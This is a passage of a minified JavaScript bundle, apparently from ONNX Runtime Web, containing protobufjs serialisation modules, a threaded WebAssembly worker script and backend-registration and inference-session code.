out="",i=0;i<count;i++)out+=(65536*(1+Math.random())|0).toString(16).substring(1);return out},Guid.prototype.equals=function(other){return Guid.isGuid(other)&&this.value===other.toString()},Guid.prototype.isEmpty=function(){return this.value===Guid.EMPTY},Guid.prototype.toString=function(){return this.value},Guid.prototype.toJSON=function(){return{value:this.value}},Guid.validator=new RegExp("^[a-z0-9]{8}-[a-z0-9]{4}-[a-z0-9]{4}-[a-z0-9]{4}-[a-z0-9]{12}$","i"),Guid.EMPTY="00000000-0000-0000-0000-000000000000",Guid}();exports.Guid=Guid},"./node_modules/protobufjs/minimal.js":(module,__unused_webpack_exports,__webpack_require__)=>{"use strict";module.exports=__webpack_require__("./node_modules/protobufjs/src/index-minimal.js")},"./node_modules/protobufjs/src/index-minimal.js":(__unused_webpack_module,exports,__webpack_require__)=>{"use strict";var protobuf=exports;function configure(){protobuf.util._configure(),protobuf.Writer._configure(protobuf.BufferWriter),protobuf.Reader._configure(protobuf.BufferReader)}protobuf.build="minimal",protobuf.Writer=__webpack_require__("./node_modules/protobufjs/src/writer.js"),protobuf.BufferWriter=__webpack_require__("./node_modules/protobufjs/src/writer_buffer.js"),protobuf.Reader=__webpack_require__("./node_modules/protobufjs/src/reader.js"),protobuf.BufferReader=__webpack_require__("./node_modules/protobufjs/src/reader_buffer.js"),protobuf.util=__webpack_require__("./node_modules/protobufjs/src/util/minimal.js"),protobuf.rpc=__webpack_require__("./node_modules/protobufjs/src/rpc.js"),protobuf.roots=__webpack_require__("./node_modules/protobufjs/src/roots.js"),protobuf.configure=configure,configure()},"./node_modules/protobufjs/src/reader.js":(module,__unused_webpack_exports,__webpack_require__)=>{"use strict";module.exports=Reader;var BufferReader,util=__webpack_require__("./node_modules/protobufjs/src/util/minimal.js"),LongBits=util.LongBits,utf8=util.utf8;function indexOutOfRange(reader,writeLength){return RangeError("index out of range: "+reader.pos+" + "+(writeLength||1)+" > "+reader.len)}function Reader(buffer){this.buf=buffer,this.pos=0,this.len=buffer.length}var create_array="undefined"!=typeof Uint8Array?function create_typed_array(buffer){if(buffer instanceof Uint8Array||Array.isArray(buffer))return new Reader(buffer);throw Error("illegal buffer")}:function create_array(buffer){if(Array.isArray(buffer))return new Reader(buffer);throw Error("illegal buffer")},create=function create(){return util.Buffer?function create_buffer_setup(buffer){return(Reader.create=function create_buffer(buffer){return util.Buffer.isBuffer(buffer)?new BufferReader(buffer):create_array(buffer)})(buffer)}:create_array};function readLongVarint(){var bits=new LongBits(0,0),i=0;if(!(this.len-this.pos>4)){for(;i<3;++i){if(this.pos>=this.len)throw indexOutOfRange(this);if(bits.lo=(bits.lo|(127&this.buf[this.pos])<<7*i)>>>0,this.buf[this.pos++]<128)return bits}return bits.lo=(bits.lo|(127&this.buf[this.pos++])<<7*i)>>>0,bits}for(;i<4;++i)if(bits.lo=(bits.lo|(127&this.buf[this.pos])<<7*i)>>>0,this.buf[this.pos++]<128)return bits;if(bits.lo=(bits.lo|(127&this.buf[this.pos])<<28)>>>0,bits.hi=(bits.hi|(127&this.buf[this.pos])>>4)>>>0,this.buf[this.pos++]<128)return bits;if(i=0,this.len-this.pos>4){for(;i<5;++i)if(bits.hi=(bits.hi|(127&this.buf[this.pos])<<7*i+3)>>>0,this.buf[this.pos++]<128)return bits}else for(;i<5;++i){if(this.pos>=this.len)throw indexOutOfRange(this);if(bits.hi=(bits.hi|(127&this.buf[this.pos])<<7*i+3)>>>0,this.buf[this.pos++]<128)return bits}throw Error("invalid varint encoding")}function readFixed32_end(buf,end){return(buf[end-4]|buf[end-3]<<8|buf[end-2]<<16|buf[end-1]<<24)>>>0}function readFixed64(){if(this.pos+8>this.len)throw indexOutOfRange(this,8);return new LongBits(readFixed32_end(this.buf,this.pos+=4),readFixed32_end(this.buf,this.pos+=4))}Reader.create=create(),Reader.prototype._slice=util.Array.prototype.subarray||util.Array.prototype.slice,Reader.prototype.uint32=function read_uint32_setup(){var value=4294967295;return function read_uint32(){if(value=(127&this.buf[this.pos])>>>0,this.buf[this.pos++]<128)return value;if(value=(value|(127&this.buf[this.pos])<<7)>>>0,this.buf[this.pos++]<128)return value;if(value=(value|(127&this.buf[this.pos])<<14)>>>0,this.buf[this.pos++]<128)return value;if(value=(value|(127&this.buf[this.pos])<<21)>>>0,this.buf[this.pos++]<128)return value;if(value=(value|(15&this.buf[this.pos])<<28)>>>0,this.buf[this.pos++]<128)return value;if((this.pos+=5)>this.len)throw this.pos=this.len,indexOutOfRange(this,10);return value}}(),Reader.prototype.int32=function read_int32(){return 0|this.uint32()},Reader.prototype.sint32=function read_sint32(){var value=this.uint32();return value>>>1^-(1&value)|0},Reader.prototype.bool=function read_bool(){return 0!==this.uint32()},Reader.prototype.fixed32=function read_fixed32(){if(this.pos+4>this.len)throw indexOutOfRange(this,4);return readFixed32_end(this.buf,this.pos+=4)},Reader.prototype.sfixed32=function read_sfixed32(){if(this.pos+4>this.len)throw indexOutOfRange(this,4);return 0|readFixed32_end(this.buf,this.pos+=4)},Reader.prototype.float=function read_float(){if(this.pos+4>this.len)throw indexOutOfRange(this,4);var value=util.float.readFloatLE(this.buf,this.pos);return this.pos+=4,value},Reader.prototype.double=function read_double(){if(this.pos+8>this.len)throw indexOutOfRange(this,4);var value=util.float.readDoubleLE(this.buf,this.pos);return this.pos+=8,value},Reader.prototype.bytes=function read_bytes(){var length=this.uint32(),start=this.pos,end=this.pos+length;if(end>this.len)throw indexOutOfRange(this,length);return this.pos+=length,Array.isArray(this.buf)?this.buf.slice(start,end):start===end?new this.buf.constructor(0):this._slice.call(this.buf,start,end)},Reader.prototype.string=function read_string(){var bytes=this.bytes();return utf8.read(bytes,0,bytes.length)},Reader.prototype.skip=function skip(length){if("number"==typeof length){if(this.pos+length>this.len)throw indexOutOfRange(this,length);this.pos+=length}else do{if(this.pos>=this.len)throw indexOutOfRange(this)}while(128&this.buf[this.pos++]);return this},Reader.prototype.skipType=function(wireType){switch(wireType){case 0:this.skip();break;case 1:this.skip(8);break;case 2:this.skip(this.uint32());break;case 3:for(;4!=(wireType=7&this.uint32());)this.skipType(wireType);break;case 5:this.skip(4);break;default:throw Error("invalid wire type "+wireType+" at offset "+this.pos)}return this},Reader._configure=function(BufferReader_){BufferReader=BufferReader_,Reader.create=create(),BufferReader._configure();var fn=util.Long?"toLong":"toNumber";util.merge(Reader.prototype,{int64:function read_int64(){return readLongVarint.call(this)[fn](!1)},uint64:function read_uint64(){return readLongVarint.call(this)[fn](!0)},sint64:function read_sint64(){return readLongVarint.call(this).zzDecode()[fn](!1)},fixed64:function read_fixed64(){return readFixed64.call(this)[fn](!0)},sfixed64:function read_sfixed64(){return readFixed64.call(this)[fn](!1)}})}},"./node_modules/protobufjs/src/reader_buffer.js":(module,__unused_webpack_exports,__webpack_require__)=>{"use strict";module.exports=BufferReader;var Reader=__webpack_require__("./node_modules/protobufjs/src/reader.js");(BufferReader.prototype=Object.create(Reader.prototype)).constructor=BufferReader;var util=__webpack_require__("./node_modules/protobufjs/src/util/minimal.js");function BufferReader(buffer){Reader.call(this,buffer)}BufferReader._configure=function(){util.Buffer&&(BufferReader.prototype._slice=util.Buffer.prototype.slice)},BufferReader.prototype.string=function read_string_buffer(){var len=this.uint32();return this.buf.utf8Slice?this.buf.utf8Slice(this.pos,this.pos=Math.min(this.pos+len,this.len)):this.buf.toString("utf-8",this.pos,this.pos=Math.min(this.pos+len,this.len))},BufferReader._configure()},"./node_modules/protobufjs/src/roots.js":module=>{"use strict";module.exports={}},"./node_modules/protobufjs/src/rpc.js":(__unused_webpack_module,exports,__webpack_require__)=>{"use strict";exports.Service=__webpack_require__("./node_modules/protobufjs/src/rpc/service.js")},"./node_modules/protobufjs/src/rpc/service.js":(module,__unused_webpack_exports,__webpack_require__)=>{"use strict";module.exports=Service;var util=__webpack_require__("./node_modules/protobufjs/src/util/minimal.js");function Service(rpcImpl,requestDelimited,responseDelimited){if("function"!=typeof rpcImpl)throw TypeError("rpcImpl must be a function");util.EventEmitter.call(this),this.rpcImpl=rpcImpl,this.requestDelimited=Boolean(requestDelimited),this.responseDelimited=Boolean(responseDelimited)}(Service.prototype=Object.create(util.EventEmitter.prototype)).constructor=Service,Service.prototype.rpcCall=function rpcCall(method,requestCtor,responseCtor,request,callback){if(!request)throw TypeError("request must be specified");var self=this;if(!callback)return util.asPromise(rpcCall,self,method,requestCtor,responseCtor,request);if(self.rpcImpl)try{return self.rpcImpl(method,requestCtor[self.requestDelimited?"encodeDelimited":"encode"](request).finish(),(function rpcCallback(err,response){if(err)return self.emit("error",err,method),callback(err);if(null!==response){if(!(response instanceof responseCtor))try{response=responseCtor[self.responseDelimited?"decodeDelimited":"decode"](response)}catch(err){return self.emit("error",err,method),callback(err)}return self.emit("data",response,method),callback(null,response)}self.end(!0)}))}catch(err){return self.emit("error",err,method),void setTimeout((function(){callback(err)}),0)}else setTimeout((function(){callback(Error("already ended"))}),0)},Service.prototype.end=function end(endedByRPC){return this.rpcImpl&&(endedByRPC||this.rpcImpl(null,null,null),this.rpcImpl=null,this.emit("end").off()),this}},"./node_modules/protobufjs/src/util/longbits.js":(module,__unused_webpack_exports,__webpack_require__)=>{"use strict";module.exports=LongBits;var util=__webpack_require__("./node_modules/protobufjs/src/util/minimal.js");function LongBits(lo,hi){this.lo=lo>>>0,this.hi=hi>>>0}var zero=LongBits.zero=new LongBits(0,0);zero.toNumber=function(){return 0},zero.zzEncode=zero.zzDecode=function(){return this},zero.length=function(){return 1};var zeroHash=LongBits.zeroHash="\0\0\0\0\0\0\0\0";LongBits.fromNumber=function fromNumber(value){if(0===value)return zero;var sign=value<0;sign&&(value=-value);var lo=value>>>0,hi=(value-lo)/4294967296>>>0;return sign&&(hi=~hi>>>0,lo=~lo>>>0,++lo>4294967295&&(lo=0,++hi>4294967295&&(hi=0))),new LongBits(lo,hi)},LongBits.from=function from(value){if("number"==typeof value)return LongBits.fromNumber(value);if(util.isString(value)){if(!util.Long)return LongBits.fromNumber(parseInt(value,10));value=util.Long.fromString(value)}return value.low||value.high?new LongBits(value.low>>>0,value.high>>>0):zero},LongBits.prototype.toNumber=function toNumber(unsigned){if(!unsigned&&this.hi>>>31){var lo=1+~this.lo>>>0,hi=~this.hi>>>0;return lo||(hi=hi+1>>>0),-(lo+4294967296*hi)}return this.lo+4294967296*this.hi},LongBits.prototype.toLong=function toLong(unsigned){return util.Long?new util.Long(0|this.lo,0|this.hi,Boolean(unsigned)):{low:0|this.lo,high:0|this.hi,unsigned:Boolean(unsigned)}};var charCodeAt=String.prototype.charCodeAt;LongBits.fromHash=function fromHash(hash){return hash===zeroHash?zero:new LongBits((charCodeAt.call(hash,0)|charCodeAt.call(hash,1)<<8|charCodeAt.call(hash,2)<<16|charCodeAt.call(hash,3)<<24)>>>0,(charCodeAt.call(hash,4)|charCodeAt.call(hash,5)<<8|charCodeAt.call(hash,6)<<16|charCodeAt.call(hash,7)<<24)>>>0)},LongBits.prototype.toHash=function toHash(){return String.fromCharCode(255&this.lo,this.lo>>>8&255,this.lo>>>16&255,this.lo>>>24,255&this.hi,this.hi>>>8&255,this.hi>>>16&255,this.hi>>>24)},LongBits.prototype.zzEncode=function zzEncode(){var mask=this.hi>>31;return this.hi=((this.hi<<1|this.lo>>>31)^mask)>>>0,this.lo=(this.lo<<1^mask)>>>0,this},LongBits.prototype.zzDecode=function zzDecode(){var mask=-(1&this.lo);return this.lo=((this.lo>>>1|this.hi<<31)^mask)>>>0,this.hi=(this.hi>>>1^mask)>>>0,this},LongBits.prototype.length=function length(){var part0=this.lo,part1=(this.lo>>>28|this.hi<<4)>>>0,part2=this.hi>>>24;return 0===part2?0===part1?part0<16384?part0<128?1:2:part0<2097152?3:4:part1<16384?part1<128?5:6:part1<2097152?7:8:part2<128?9:10}},"./node_modules/protobufjs/src/util/minimal.js":function(__unused_webpack_module,exports,__webpack_require__){"use strict";var util=exports;function merge(dst,src,ifNotSet){for(var keys=Object.keys(src),i=0;i<keys.length;++i)void 0!==dst[keys[i]]&&ifNotSet||(dst[keys[i]]=src[keys[i]]);return dst}function newError(name){function CustomError(message,properties){if(!(this instanceof CustomError))return new CustomError(message,properties);Object.defineProperty(this,"message",{get:function(){return message}}),Error.captureStackTrace?Error.captureStackTrace(this,CustomError):Object.defineProperty(this,"stack",{value:(new Error).stack||""}),properties&&merge(this,properties)}return CustomError.prototype=Object.create(Error.prototype,{constructor:{value:CustomError,writable:!0,enumerable:!1,configurable:!0},name:{get:function get(){return name},set:void 0,enumerable:!1,configurable:!0},toString:{value:function value(){return this.name+": "+this.message},writable:!0,enumerable:!1,configurable:!0}}),CustomError}util.asPromise=__webpack_require__("./node_modules/@protobufjs/aspromise/index.js"),util.base64=__webpack_require__("./node_modules/@protobufjs/base64/index.js"),util.EventEmitter=__webpack_require__("./node_modules/@protobufjs/eventemitter/index.js"),util.float=__webpack_require__("./node_modules/@protobufjs/float/index.js"),util.inquire=__webpack_require__("./node_modules/@protobufjs/inquire/index.js"),util.utf8=__webpack_require__("./node_modules/@protobufjs/utf8/index.js"),util.pool=__webpack_require__("./node_modules/@protobufjs/pool/index.js"),util.LongBits=__webpack_require__("./node_modules/protobufjs/src/util/longbits.js"),util.isNode=Boolean("undefined"!=typeof global&&global&&global.process&&global.process.versions&&global.process.versions.node),util.global=util.isNode&&global||"undefined"!=typeof window&&window||"undefined"!=typeof self&&self||this,util.emptyArray=Object.freeze?Object.freeze([]):[],util.emptyObject=Object.freeze?Object.freeze({}):{},util.isInteger=Number.isInteger||function isInteger(value){return"number"==typeof value&&isFinite(value)&&Math.floor(value)===value},util.isString=function isString(value){return"string"==typeof value||value instanceof String},util.isObject=function isObject(value){return value&&"object"==typeof value},util.isset=util.isSet=function isSet(obj,prop){var value=obj[prop];return!(null==value||!obj.hasOwnProperty(prop))&&("object"!=typeof value||(Array.isArray(value)?value.length:Object.keys(value).length)>0)},util.Buffer=function(){try{var Buffer=util.inquire("buffer").Buffer;return Buffer.prototype.utf8Write?Buffer:null}catch(e){return null}}(),util._Buffer_from=null,util._Buffer_allocUnsafe=null,util.newBuffer=function newBuffer(sizeOrArray){return"number"==typeof sizeOrArray?util.Buffer?util._Buffer_allocUnsafe(sizeOrArray):new util.Array(sizeOrArray):util.Buffer?util._Buffer_from(sizeOrArray):"undefined"==typeof Uint8Array?sizeOrArray:new Uint8Array(sizeOrArray)},util.Array="undefined"!=typeof Uint8Array?Uint8Array:Array,util.Long=util.global.dcodeIO&&util.global.dcodeIO.Long||util.global.Long||util.inquire("long"),util.key2Re=/^true|false|0|1$/,util.key32Re=/^-?(?:0|[1-9][0-9]*)$/,util.key64Re=/^(?:[\\x00-\\xff]{8}|-?(?:0|[1-9][0-9]*))$/,util.longToHash=function longToHash(value){return value?util.LongBits.from(value).toHash():util.LongBits.zeroHash},util.longFromHash=function longFromHash(hash,unsigned){var bits=util.LongBits.fromHash(hash);return util.Long?util.Long.fromBits(bits.lo,bits.hi,unsigned):bits.toNumber(Boolean(unsigned))},util.merge=merge,util.lcFirst=function lcFirst(str){return str.charAt(0).toLowerCase()+str.substring(1)},util.newError=newError,util.ProtocolError=newError("ProtocolError"),util.oneOfGetter=function getOneOf(fieldNames){for(var fieldMap={},i=0;i<fieldNames.length;++i)fieldMap[fieldNames[i]]=1;return function(){for(var keys=Object.keys(this),i=keys.length-1;i>-1;--i)if(1===fieldMap[keys[i]]&&void 0!==this[keys[i]]&&null!==this[keys[i]])return keys[i]}},util.oneOfSetter=function setOneOf(fieldNames){return function(name){for(var i=0;i<fieldNames.length;++i)fieldNames[i]!==name&&delete this[fieldNames[i]]}},util.toJSONOptions={longs:String,enums:String,bytes:String,json:!0},util._configure=function(){var Buffer=util.Buffer;Buffer?(util._Buffer_from=Buffer.from!==Uint8Array.from&&Buffer.from||function Buffer_from(value,encoding){return new Buffer(value,encoding)},util._Buffer_allocUnsafe=Buffer.allocUnsafe||function Buffer_allocUnsafe(size){return new Buffer(size)}):util._Buffer_from=util._Buffer_allocUnsafe=null}},"./node_modules/protobufjs/src/writer.js":(module,__unused_webpack_exports,__webpack_require__)=>{"use strict";module.exports=Writer;var BufferWriter,util=__webpack_require__("./node_modules/protobufjs/src/util/minimal.js"),LongBits=util.LongBits,base64=util.base64,utf8=util.utf8;function Op(fn,len,val){this.fn=fn,this.len=len,this.next=void 0,this.val=val}function noop(){}function State(writer){this.head=writer.head,this.tail=writer.tail,this.len=writer.len,this.next=writer.states}function Writer(){this.len=0,this.head=new Op(noop,0,0),this.tail=this.head,this.states=null}var create=function create(){return util.Buffer?function create_buffer_setup(){return(Writer.create=function create_buffer(){return new BufferWriter})()}:function create_array(){return new Writer}};function writeByte(val,buf,pos){buf[pos]=255&val}function VarintOp(len,val){this.len=len,this.next=void 0,this.val=val}function writeVarint64(val,buf,pos){for(;val.hi;)buf[pos++]=127&val.lo|128,val.lo=(val.lo>>>7|val.hi<<25)>>>0,val.hi>>>=7;for(;val.lo>127;)buf[pos++]=127&val.lo|128,val.lo=val.lo>>>7;buf[pos++]=val.lo}function writeFixed32(val,buf,pos){buf[pos]=255&val,buf[pos+1]=val>>>8&255,buf[pos+2]=val>>>16&255,buf[pos+3]=val>>>24}Writer.create=create(),Writer.alloc=function alloc(size){return new util.Array(size)},util.Array!==Array&&(Writer.alloc=util.pool(Writer.alloc,util.Array.prototype.subarray)),Writer.prototype._push=function push(fn,len,val){return this.tail=this.tail.next=new Op(fn,len,val),this.len+=len,this},VarintOp.prototype=Object.create(Op.prototype),VarintOp.prototype.fn=function writeVarint32(val,buf,pos){for(;val>127;)buf[pos++]=127&val|128,val>>>=7;buf[pos]=val},Writer.prototype.uint32=function write_uint32(value){return this.len+=(this.tail=this.tail.next=new VarintOp((value>>>=0)<128?1:value<16384?2:value<2097152?3:value<268435456?4:5,value)).len,this},Writer.prototype.int32=function write_int32(value){return value<0?this._push(writeVarint64,10,LongBits.fromNumber(value)):this.uint32(value)},Writer.prototype.sint32=function write_sint32(value){return this.uint32((value<<1^value>>31)>>>0)},Writer.prototype.uint64=function write_uint64(value){var bits=LongBits.from(value);return this._push(writeVarint64,bits.length(),bits)},Writer.prototype.int64=Writer.prototype.uint64,Writer.prototype.sint64=function write_sint64(value){var bits=LongBits.from(value).zzEncode();return this._push(writeVarint64,bits.length(),bits)},Writer.prototype.bool=function write_bool(value){return this._push(writeByte,1,value?1:0)},Writer.prototype.fixed32=function write_fixed32(value){return this._push(writeFixed32,4,value>>>0)},Writer.prototype.sfixed32=Writer.prototype.fixed32,Writer.prototype.fixed64=function write_fixed64(value){var bits=LongBits.from(value);return this._push(writeFixed32,4,bits.lo)._push(writeFixed32,4,bits.hi)},Writer.prototype.sfixed64=Writer.prototype.fixed64,Writer.prototype.float=function write_float(value){return this._push(util.float.writeFloatLE,4,value)},Writer.prototype.double=function write_double(value){return this._push(util.float.writeDoubleLE,8,value)};var writeBytes=util.Array.prototype.set?function writeBytes_set(val,buf,pos){buf.set(val,pos)}:function writeBytes_for(val,buf,pos){for(var i=0;i<val.length;++i)buf[pos+i]=val[i]};Writer.prototype.bytes=function write_bytes(value){var len=value.length>>>0;if(!len)return this._push(writeByte,1,0);if(util.isString(value)){var buf=Writer.alloc(len=base64.length(value));base64.decode(value,buf,0),value=buf}return this.uint32(len)._push(writeBytes,len,value)},Writer.prototype.string=function write_string(value){var len=utf8.length(value);return len?this.uint32(len)._push(utf8.write,len,value):this._push(writeByte,1,0)},Writer.prototype.fork=function fork(){return this.states=new State(this),this.head=this.tail=new Op(noop,0,0),this.len=0,this},Writer.prototype.reset=function reset(){return this.states?(this.head=this.states.head,this.tail=this.states.tail,this.len=this.states.len,this.states=this.states.next):(this.head=this.tail=new Op(noop,0,0),this.len=0),this},Writer.prototype.ldelim=function ldelim(){var head=this.head,tail=this.tail,len=this.len;return this.reset().uint32(len),len&&(this.tail.next=head.next,this.tail=tail,this.len+=len),this},Writer.prototype.finish=function finish(){for(var head=this.head.next,buf=this.constructor.alloc(this.len),pos=0;head;)head.fn(head.val,buf,pos),pos+=head.len,head=head.next;return buf},Writer._configure=function(BufferWriter_){BufferWriter=BufferWriter_,Writer.create=create(),BufferWriter._configure()}},"./node_modules/protobufjs/src/writer_buffer.js":(module,__unused_webpack_exports,__webpack_require__)=>{"use strict";module.exports=BufferWriter;var Writer=__webpack_require__("./node_modules/protobufjs/src/writer.js");(BufferWriter.prototype=Object.create(Writer.prototype)).constructor=BufferWriter;var util=__webpack_require__("./node_modules/protobufjs/src/util/minimal.js");function BufferWriter(){Writer.call(this)}function writeStringBuffer(val,buf,pos){val.length<40?util.utf8.write(val,buf,pos):buf.utf8Write?buf.utf8Write(val,pos):buf.write(val,pos)}BufferWriter._configure=function(){BufferWriter.alloc=util._Buffer_allocUnsafe,BufferWriter.writeBytesBuffer=util.Buffer&&util.Buffer.prototype instanceof Uint8Array&&"set"===util.Buffer.prototype.set.name?function writeBytesBuffer_set(val,buf,pos){buf.set(val,pos)}:function writeBytesBuffer_copy(val,buf,pos){if(val.copy)val.copy(buf,pos,0,val.length);else for(var i=0;i<val.length;)buf[pos++]=val[i++]}},BufferWriter.prototype.bytes=function write_bytes_buffer(value){util.isString(value)&&(value=util._Buffer_from(value,"base64"));var len=value.length>>>0;return this.uint32(len),len&&this._push(BufferWriter.writeBytesBuffer,len,value),this},BufferWriter.prototype.string=function write_string_buffer(value){var len=util.Buffer.byteLength(value);return this.uint32(len),len&&this._push(writeStringBuffer,len,value),this},BufferWriter._configure()},"./lib/wasm/binding/ort-wasm-threaded.worker.js":module=>{"use strict";module.exports='"use strict";var Module={};var ENVIRONMENT_IS_NODE=typeof process=="object"&&typeof process.versions=="object"&&typeof process.versions.node=="string";if(ENVIRONMENT_IS_NODE){var nodeWorkerThreads=require("worker_threads");var parentPort=nodeWorkerThreads.parentPort;parentPort.on("message",data=>onmessage({data:data}));var fs=require("fs");Object.assign(global,{self:global,require:require,Module:Module,location:{href:__filename},Worker:nodeWorkerThreads.Worker,importScripts:f=>(0,eval)(fs.readFileSync(f,"utf8")+"//# sourceURL="+f),postMessage:msg=>parentPort.postMessage(msg),performance:global.performance||{now:Date.now}})}var initializedJS=false;function threadPrintErr(){var text=Array.prototype.slice.call(arguments).join(" ");if(ENVIRONMENT_IS_NODE){fs.writeSync(2,text+"\\n");return}console.error(text)}function threadAlert(){var text=Array.prototype.slice.call(arguments).join(" ");postMessage({cmd:"alert",text:text,threadId:Module["_pthread_self"]()})}var err=threadPrintErr;self.alert=threadAlert;Module["instantiateWasm"]=(info,receiveInstance)=>{var module=Module["wasmModule"];Module["wasmModule"]=null;var instance=new WebAssembly.Instance(module,info);return receiveInstance(instance)};self.onunhandledrejection=e=>{throw e.reason??e};function handleMessage(e){try{if(e.data.cmd==="load"){let messageQueue=[];self.onmessage=e=>messageQueue.push(e);self.startWorker=instance=>{Module=instance;postMessage({"cmd":"loaded"});for(let msg of messageQueue){handleMessage(msg)}self.onmessage=handleMessage};Module["wasmModule"]=e.data.wasmModule;for(const handler of e.data.handlers){Module[handler]=(...args)=>{postMessage({cmd:"callHandler",handler:handler,args:args})}}Module["wasmMemory"]=e.data.wasmMemory;Module["buffer"]=Module["wasmMemory"].buffer;Module["ENVIRONMENT_IS_PTHREAD"]=true;if(typeof e.data.urlOrBlob=="string"){importScripts(e.data.urlOrBlob)}else{var objectUrl=URL.createObjectURL(e.data.urlOrBlob);importScripts(objectUrl);URL.revokeObjectURL(objectUrl)}ortWasmThreaded(Module)}else if(e.data.cmd==="run"){Module["__emscripten_thread_init"](e.data.pthread_ptr,/*isMainBrowserThread=*/0,/*isMainRuntimeThread=*/0,/*canBlock=*/1);Module["__emscripten_thread_mailbox_await"](e.data.pthread_ptr);Module["establishStackSpace"]();Module["PThread"].receiveObjectTransfer(e.data);Module["PThread"].threadInitTLS();if(!initializedJS){initializedJS=true}try{Module["invokeEntryPoint"](e.data.start_routine,e.data.arg)}catch(ex){if(ex!="unwind"){throw ex}}}else if(e.data.cmd==="cancel"){if(Module["_pthread_self"]()){Module["__emscripten_thread_exit"](-1)}}else if(e.data.target==="setimmediate"){}else if(e.data.cmd==="checkMailbox"){if(initializedJS){Module["checkMailbox"]()}}else if(e.data.cmd){err("worker.js received unknown command "+e.data.cmd);err(e.data)}}catch(ex){if(Module["__emscripten_thread_crashed"]){Module["__emscripten_thread_crashed"]()}throw ex}}self.onmessage=handleMessage;\r\n'},"?6c45":()=>{},"?b3a2":()=>{},"?892d":()=>{},"?63c8":()=>{},"?aedb":()=>{},"?75c6":()=>{},"?674f":()=>{},"?c6f7":()=>{},"?295d":()=>{},"?7aa5":()=>{},"?cf98":()=>{},"?0757":()=>{},"../common/dist/cjs/backend-impl.js":(__unused_webpack_module,exports)=>{"use strict";Object.defineProperty(exports,"__esModule",{value:!0}),exports.resolveBackend=exports.registerBackend=void 0;const backends={},backendsSortedByPriority=[];exports.registerBackend=(name,backend,priority)=>{if(!backend||"function"!=typeof backend.init||"function"!=typeof backend.createSessionHandler)throw new TypeError("not a valid backend");{const currentBackend=backends[name];if(void 0===currentBackend)backends[name]={backend:backend,priority:priority};else{if(currentBackend.priority>priority)return;if(currentBackend.priority===priority&&currentBackend.backend!==backend)throw new Error(`cannot register backend "${name}" using priority ${priority}`)}if(priority>=0){const i=backendsSortedByPriority.indexOf(name);-1!==i&&backendsSortedByPriority.splice(i,1);for(let i=0;i<backendsSortedByPriority.length;i++)if(backends[backendsSortedByPriority[i]].priority<=priority)return void backendsSortedByPriority.splice(i,0,name);backendsSortedByPriority.push(name)}}};exports.resolveBackend=async backendHints=>{const backendNames=0===backendHints.length?backendsSortedByPriority:backendHints,errors=[];for(const backendName of backendNames){const backendInfo=backends[backendName];if(backendInfo){if(backendInfo.initialized)return backendInfo.backend;if(backendInfo.aborted)continue;const isInitializing=!!backendInfo.initPromise;try{return isInitializing||(backendInfo.initPromise=backendInfo.backend.init()),await backendInfo.initPromise,backendInfo.initialized=!0,backendInfo.backend}catch(e){isInitializing||errors.push({name:backendName,err:e}),backendInfo.aborted=!0}finally{delete backendInfo.initPromise}}}throw new Error(`no available backend found. ERR: ${errors.map((e=>`[${e.name}] ${e.err}`)).join(", ")}`)}},"../common/dist/cjs/backend.js":(__unused_webpack_module,exports,__webpack_require__)=>{"use strict";Object.defineProperty(exports,"__esModule",{value:!0}),exports.registerBackend=void 0;var backend_impl_js_1=__webpack_require__("../common/dist/cjs/backend-impl.js");Object.defineProperty(exports,"registerBackend",{enumerable:!0,get:function(){return backend_impl_js_1.registerBackend}})},"../common/dist/cjs/env-impl.js":(__unused_webpack_module,exports,__webpack_require__)=>{"use strict";Object.defineProperty(exports,"__esModule",{value:!0}),exports.env=void 0;const version_js_1=__webpack_require__("../common/dist/cjs/version.js");let logLevelValue="warning";exports.env={wasm:{},webgl:{},webgpu:{},versions:{common:version_js_1.version},set logLevel(value){if(void 0!==value){if("string"!=typeof value||-1===["verbose","info","warning","error","fatal"].indexOf(value))throw new Error(`Unsupported logging level: ${value}`);logLevelValue=value}},get logLevel(){return logLevelValue}},Object.defineProperty(exports.env,"logLevel",{enumerable:!0})},"../common/dist/cjs/env.js":(__unused_webpack_module,exports,__webpack_require__)=>{"use strict";Object.defineProperty(exports,"__esModule",{value:!0}),exports.env=void 0;const env_impl_js_1=__webpack_require__("../common/dist/cjs/env-impl.js");exports.env=env_impl_js_1.env},"../common/dist/cjs/index.js":function(__unused_webpack_module,exports,__webpack_require__){"use strict";var __createBinding=this&&this.__createBinding||(Object.create?function(o,m,k,k2){void 0===k2&&(k2=k);var desc=Object.getOwnPropertyDescriptor(m,k);desc&&!("get"in desc?!m.__esModule:desc.writable||desc.configurable)||(desc={enumerable:!0,get:function(){return m[k]}}),Object.defineProperty(o,k2,desc)}:function(o,m,k,k2){void 0===k2&&(k2=k),o[k2]=m[k]}),__exportStar=this&&this.__exportStar||function(m,exports){for(var p in m)"default"===p||Object.prototype.hasOwnProperty.call(exports,p)||__createBinding(exports,m,p)};Object.defineProperty(exports,"__esModule",{value:!0}),__exportStar(__webpack_require__("../common/dist/cjs/backend.js"),exports),__exportStar(__webpack_require__("../common/dist/cjs/env.js"),exports),__exportStar(__webpack_require__("../common/dist/cjs/inference-session.js"),exports),__exportStar(__webpack_require__("../common/dist/cjs/tensor.js"),exports),__exportStar(__webpack_require__("../common/dist/cjs/onnx-value.js"),exports)},"../common/dist/cjs/inference-session-impl.js":(__unused_webpack_module,exports,__webpack_require__)=>{"use strict";Object.defineProperty(exports,"__esModule",{value:!0}),exports.InferenceSession=void 0;const backend_impl_js_1=__webpack_require__("../common/dist/cjs/backend-impl.js"),tensor_js_1=__webpack_require__("../common/dist/cjs/tensor.js");class InferenceSession{constructor(handler){this.handler=handler}async run(feeds,arg1,arg2){const fetches={};let options={};if("object"!=typeof feeds||null===feeds||feeds instanceof tensor_js_1.Tensor||Array.isArray(feeds))throw new TypeError("'feeds' must be an object that use input names as keys and OnnxValue as corresponding values.");let isFetchesEmpty=!0;if("object"==typeof arg1){if(null===arg1)throw new TypeError("Unexpected argument[1]: cannot be null.");if(arg1 instanceof tensor_js_1.Tensor)throw new TypeError("'fetches' cannot be a Tensor");if(Array.isArray(arg1)){if(0===arg1.length)throw new TypeError("'fetches' cannot be an empty array.");isFetchesEmpty=!1;for(const name of arg1){if("string"!=typeof name)throw new TypeError("'fetches' must be a string array or an object.");if(-1===this.outputNames.indexOf(name))throw new RangeError(`'fetches' contains invalid output name: ${name}.`);fetches[name]=null}if("object"==typeof arg2&&null!==arg2)options=arg2;else if(void 0!==arg2)throw new TypeError("'options' must be an object.")}else{let isFetches=!1;const arg1Keys=Object.getOwnPropertyNames(arg1);for(const name of this.outputNames)if(-1!==arg1Keys.indexOf(name)){const 